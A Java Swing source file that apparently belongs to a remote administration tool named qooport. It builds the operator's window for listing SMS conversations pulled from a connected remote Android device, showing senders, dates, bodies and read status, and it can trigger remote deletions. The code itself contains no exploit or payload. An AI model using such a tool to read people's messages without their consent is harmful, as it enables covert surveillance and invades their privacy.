package qooport.modulos.android;

import comunes.Sms;
import comunes.SmsConversacion;
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Component;
import java.awt.Font;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.BorderFactory;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JList;
import javax.swing.JMenuItem;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JPopupMenu;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.JToolBar;
import javax.swing.ListCellRenderer;
import javax.swing.table.DefaultTableCellRenderer;
import javax.swing.table.DefaultTableModel;
import javax.swing.text.BadLocationException;
import qooport.asociado.Asociado;
import static qooport.avanzado.QoopoRT.tipoLetra;
import qooport.utilidades.Util;

public class SMSListar extends JFrame {

    public JToolBar barra;
    public String sep = "/";
    public boolean conectado;
    private JButton btnActDrives;
    private JTable tabla;
    private JTable conversaciones;
    private DefaultTableModel modelotabla;
    private DefaultTableModel modelohilos;
    private JScrollPane jScrollHilos;
    private JScrollPane jScrollPane1;
    private JTextField ruta;
    private JPanel contenedorPrincipal;
    private JPopupMenu menu;
    private JMenuItem eliminar;
    private JMenuItem crearCarpeta;
    private Asociado servidor;
    private String rutaPosterior = "";
    private String seleccionado;
    private ImageIcon[] unidades;
    private JPanel panelInfo;
    private JLabel vistaPrevia;
    private ArrayList<SmsConversacion> hilos;
    public JTextPane paneMensajes;

    public SMSListar(Asociado servidor) {
        initComponents();
//        this.tabla.getColumnModel().getColumn(0).setCellRenderer(new CeldaTipo());
        this.modelotabla = ((DefaultTableModel) this.tabla.getModel());
        this.modelohilos = ((DefaultTableModel) this.conversaciones.getModel());
        this.tabla.getColumnModel().getColumn(0).setCellRenderer(new CeldaLeido());
        this.tabla.getColumnModel().getColumn(1).setCellRenderer(new CeldaTipo());
        this.tabla.getColumnModel().getColumn(4).setCellRenderer(new CeldaFecha());
        this.servidor = servidor;
    }

    private void initComponents() {
        barra = new JToolBar();
        barra.setFloatable(false);
        this.btnActDrives = new JButton();
        this.jScrollPane1 = new JScrollPane();
        this.jScrollHilos = new JScrollPane();
        this.menu = new JPopupMenu();
        eliminar = new JMenuItem();
        crearCarpeta = new JMenuItem();
        JSplitPane splitPane = new JSplitPane();
        setResizable(true);
        try {
            setTitle("SMS [" + servidor.getInformacion() + "]");
        } catch (Exception e) {
            setTitle("SMS");
        }
        btnActDrives.setIcon(Util.cargarIcono16("/resources/refresh.png"));
        this.btnActDrives.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                SMSListar.this.btnListar(evt);
            }
        });
        this.eliminar.setText("Eliminar");
        this.eliminar.setIcon(Util.cargarIcono16("/resources/delete.png"));
        this.eliminar.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                SMSListar.this.eliminarActionPerformed(evt);
            }
        });
        this.crearCarpeta.setText("Crear Contacto");
        this.crearCarpeta.setIcon(Util.cargarIcono16("/resources/new_folder.png"));
        this.crearCarpeta.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent evt) {
                SMSListar.this.crearCarpetaActionPerformed(evt);
            }
        });
        this.menu.add(this.eliminar);
        this.menu.add(this.crearCarpeta);
        conversaciones = new JTable();
        this.conversaciones.setComponentPopupMenu(this.menu);
        this.conversaciones.setAutoCreateRowSorter(true);
        this.conversaciones.setFont(new Font(tipoLetra, 1, 14));
//        this.conversaciones.setRowHeight(75);
//        this.conversaciones.getColumnModel().getColumn(0).setMinWidth(50);
        this.conversaciones.setModel(new DefaultTableModel(new Object[0][], new String[]{"id", "Contacto", "Ultimo Mensaje"}) {
            boolean[] canEdit = {false, false, false};

            @Override
            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.conversaciones.addMouseListener(new MouseAdapter() {
            public void mouseClicked(MouseEvent evt) {
//                Contactos.this.tablaMouseClick(evt);
            }

            public void mousePressed(MouseEvent evt) {
                SMSListar.this.tablaMousePressed(evt);
            }
        });
        this.conversaciones.getColumnModel().getColumn(0).setPreferredWidth(20);
        this.conversaciones.getColumnModel().getColumn(0).setMaxWidth(20);
        this.jScrollHilos.setViewportView(this.conversaciones);
        tabla = new JTable();
        this.tabla.setComponentPopupMenu(this.menu);
        this.tabla.setAutoCreateRowSorter(true);
        this.tabla.setFont(new Font(tipoLetra, 1, 14));
//        this.tabla.setRowHeight(75);
        this.tabla.setModel(new DefaultTableModel(new Object[0][], new String[]{"", "", "id", "Numero", "fecha", "cuerpo"}) {
            boolean[] canEdit = {false, false, false, false, false, false};

            public boolean isCellEditable(int rowIndex, int columnIndex) {
                return this.canEdit[columnIndex];
            }
        });
        this.tabla.getColumnModel().getColumn(0).setMinWidth(20);
        this.tabla.getColumnModel().getColumn(0).setPreferredWidth(20);
        this.tabla.getColumnModel().getColumn(0).setMaxWidth(20);
        this.tabla.getColumnModel().getColumn(1).setMinWidth(20);
        this.tabla.getColumnModel().getColumn(1).setPreferredWidth(20);
        this.tabla.getColumnModel().getColumn(1).setMaxWidth(20);
        this.tabla.getColumnModel().getColumn(2).setMinWidth(20);
        this.tabla.getColumnModel().getColumn(2).setPreferredWidth(20);
        this.tabla.getColumnModel().getColumn(2).setMaxWidth(20);
//        this.jScrollPane1.setViewportView(this.tabla);
        ruta = new JTextField();
        paneMensajes = new JTextPane();
        paneMensajes.setEditable(false);
        this.jScrollPane1.setViewportView(this.paneMensajes);
//        contenedorMenu = new JPanel();
//        contenedorMenu.setLayout(new GridLayout(1, 10));
        barra.add(btnActDrives);
        //   PANEL DE INFO
        vistaPrevia = new JLabel();
//        vistaPrevia.setSize(150, 150);
        vistaPrevia.setIcon(Util.cargarIcono16("/resources/sms2.png"));
        panelInfo = new JPanel();
        panelInfo.setLayout(new BorderLayout());
        panelInfo.add(vistaPrevia, BorderLayout.CENTER);
        this.panelInfo.setBorder(BorderFactory.createTitledBorder(null, "Informacion", 0, 0, new Font(tipoLetra, 1, 12), new Color(0, 102, 51)));
        contenedorPrincipal = new JPanel();
        contenedorPrincipal.setLayout(new GridLayout(1, 1));
//        contenedorPrincipal.add(jScrollPane1);
        splitPane.setLeftComponent(jScrollHilos);
        splitPane.setRightComponent(jScrollPane1);
        this.setLayout(new BorderLayout());
        this.add(barra, BorderLayout.NORTH);
        this.add(splitPane, BorderLayout.CENTER);
//        this.add(contenedorPrincipal, BorderLayout.CENTER);
//        this.add(jScrollHilos, BorderLayout.WEST);
        this.add(panelInfo, BorderLayout.EAST);
        this.setSize(400, 600);
//        this.setResizable(true);
        this.setVisible(true);
        pack();
    }

    private void btnListar(ActionEvent evt) {
        servidor.listarSMS();
    }

    public void actualizarLista() {
        servidor.listarSMS();
    }

    public JTable getTabla() {
        return tabla;
    }

    public void setTabla(JTable tabla) {
        this.tabla = tabla;
    }

    public DefaultTableModel getModelotabla() {
        return modelotabla;
    }

    public void setModelotabla(DefaultTableModel modelotabla) {
        this.modelotabla = modelotabla;
    }

    public DefaultTableModel getModelohilos() {
        return modelohilos;
    }

    public void setModelohilos(DefaultTableModel modelohilos) {
        this.modelohilos = modelohilos;
    }
//    public ModeloTabla getModelotabla() {
//        return modelotabla;
//    }
//
//    public void setModelotabla(ModeloTabla modelotabla) {
//        this.modelotabla = modelotabla;
//    }

    public void limpiatabla() {
        for (int i = this.tabla.getRowCount() - 1; i > -1; i--) {
            this.modelotabla.removeRow(i);
        }
        for (int i = this.conversaciones.getRowCount() - 1; i > -1; i--) {
            this.modelohilos.removeRow(i);
        }
        this.paneMensajes.removeAll();
    }

    public JTextField getRuta() {
        return ruta;
    }

    public void setRuta(JTextField ruta) {
        this.ruta = ruta;
    }

    private void tablaMousePressed(MouseEvent evt) {
//        if (this.tabla.getSelectedRowCount() <= 1) {
//            int t = this.tabla.rowAtPoint(evt.getPoint());
//            this.tabla.getSelectionModel().setSelectionInterval(t, t);
//        }
        String seleccionado = this.conversaciones.getValueAt(this.conversaciones.getSelectedRow(), 0).toString();
//        SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
        for (int i = this.tabla.getRowCount() - 1; i > -1; i--) {
            this.modelotabla.removeRow(i);
        }
        for (SmsConversacion c : this.hilos) {
            if (c.getIdHilo() == Integer.parseInt(seleccionado)) {
                Collections.sort(c.getMensajes(), new Comparator() {
                    @Override
                    public int compare(Object p1, Object p2) {
                        return new Date(((Sms) p1).getDate()).compareTo(
                                new Date(((Sms) p2).getDate())
                        );
                    }
                });
                for (Sms p : c.getMensajes()) {
                    MensajeSMS vsms = new MensajeSMS(p);
//                    SimpleAttributeSet attrs = new SimpleAttributeSet();
//                    if (p.getType() == 1) {
//                        StyleConstants.setAlignment(attrs, StyleConstants.ALIGN_LEFT);
//                        StyleConstants.setBold(attrs, false);
//                    } else {
//                        StyleConstants.setAlignment(attrs, StyleConstants.ALIGN_RIGHT);
//                        StyleConstants.setBold(attrs, true);
//                    }
                    this.paneMensajes.setCaretPosition(this.paneMensajes.getDocument().getLength());
                    this.paneMensajes.insertComponent(vsms);
//                    try {
//                        this.paneMensajes.getStyledDocument().insertString( paneMensajes.getStyledDocument().getLength(), p.getBody(), attrs);
//                    } catch (BadLocationException ex) {
//                        Logger.getLogger(SMSListar.class.getName()).log(Level.SEVERE, null, ex);
//                    }
                    try {
                        this.paneMensajes.getDocument().insertString(this.paneMensajes.getDocument().getLength(), "\n\n", null);
                    } catch (BadLocationException ex) {
                        Logger.getLogger(SMSListar.class.getName()).log(Level.SEVERE, null, ex);
                    }
                    // la lista
                    getModelotabla().addRow(
                            new Object[]{
                                p.getRead(),
                                p.getType(),
                                p.getId(),
                                //p.getThid(),
                                p.getAdd(),
                                // p.getPerson(),
                                p.getDate(),
                                //                                sdf.format(new Date(p.getDate())),
                                p.getBody()
                            });
                }
            }
        }
    }

    private void eliminarActionPerformed(ActionEvent evt) {
        int[] selec = this.tabla.getSelectedRows();
        for (int i = 0; i < selec.length; i++) {
            this.seleccionado = this.tabla.getValueAt(selec[i], 1).toString();
            this.rutaPosterior = (this.ruta.getText() + this.sep + this.seleccionado);
            servidor.eliminar(rutaPosterior);
        }
        this.actualizarLista();
    }

    private void crearCarpetaActionPerformed(ActionEvent evt) {
        String carpeta = JOptionPane.showInputDialog(null, "Nombre de Carpeta : ",
                "Crear Carpeta", 1);
        this.servidor.crearCarpeta(carpeta, this.ruta.getText());
        this.actualizarLista();
    }

    static class CeldaTipo extends DefaultTableCellRenderer {

        public void setValue(Object value) {
            if (value.toString().equals("1")) {
                setText("");
                setIcon(Util.cargarIcono16("/resources/msg_in.png"));
            } else {
                setIcon(Util.cargarIcono16("/resources/msg_out.png"));
            }
        }
    }

    static class CeldaLeido extends DefaultTableCellRenderer {

        public void setValue(Object value) {
            if (!value.toString().equals("1")) {
                setText("");
                setIcon(Util.cargarIcono16("/resources/new16.png"));
            } else {
//                setIcon(Util.cargarIcono16("/resources/msg_out.png")));
            }
        }
    }

    static class CeldaFecha extends DefaultTableCellRenderer {

        public void setValue(Object value) {
            SimpleDateFormat sdf = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
            setText(sdf.format(new Date(Long.valueOf(value.toString()))));
        }
    }

    public static String guardarIcono(byte[] datos, String nombre) {
        if (datos != null) {
            File file = new File(nombre);
            try {
                file.delete();
            } catch (Exception e) {
            }
            try {
                file.createNewFile();
                FileOutputStream fout = new FileOutputStream(file);
                fout.write(datos);
                fout.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return nombre;
    }

    public class ComboBoxRenderer extends JLabel
            implements ListCellRenderer {

        public ComboBoxRenderer() {
            setOpaque(true);
            setHorizontalAlignment(CENTER);
            setVerticalAlignment(CENTER);
        }

        /*
         * This method finds the image and text corresponding
         * to the selected value and returns the label, set up
         * to display the text and image.
         */
        @Override
        public Component getListCellRendererComponent(
                JList list,
                Object value,
                int index,
                boolean isSelected,
                boolean cellHasFocus) {
            try {
                int selectedIndex = ((Integer) value).intValue();
                if (isSelected) {
                    setBackground(list.getSelectionBackground());
                    setForeground(list.getSelectionForeground());
                } else {
                    setBackground(list.getBackground());
                    setForeground(list.getForeground());
                }
                //Set the icon and text.  If icon was null, say so.
                ImageIcon icon = unidades[selectedIndex];
                String texto = unidades[selectedIndex].getDescription();
                setIcon(icon);
                if (icon != null) {
                    setText(texto);
//                setFont(list.getFont());
                } else {
                    setText("");
                }
            } catch (Exception e) {
//                e.printStackTrace();
            }
            return this;
        }
    }

    public ImageIcon[] getUnidades() {
        return unidades;
    }

    public void setUnidades(ImageIcon[] unidades) {
        this.unidades = unidades;
    }

    public JLabel getVistaPrevia() {
        return vistaPrevia;
    }

    public void setVistaPrevia(JLabel vistaPrevia) {
        this.vistaPrevia = vistaPrevia;
    }

    public ArrayList<SmsConversacion> getHilos() {
        return hilos;
    }

    public void setHilos(ArrayList<SmsConversacion> hilos) {
        this.hilos = hilos;
    }

    public JTextPane getPaneMensajes() {
        return paneMensajes;
    }

    public void setPaneMensajes(JTextPane paneMensajes) {
        this.paneMensajes = paneMensajes;
    }

}
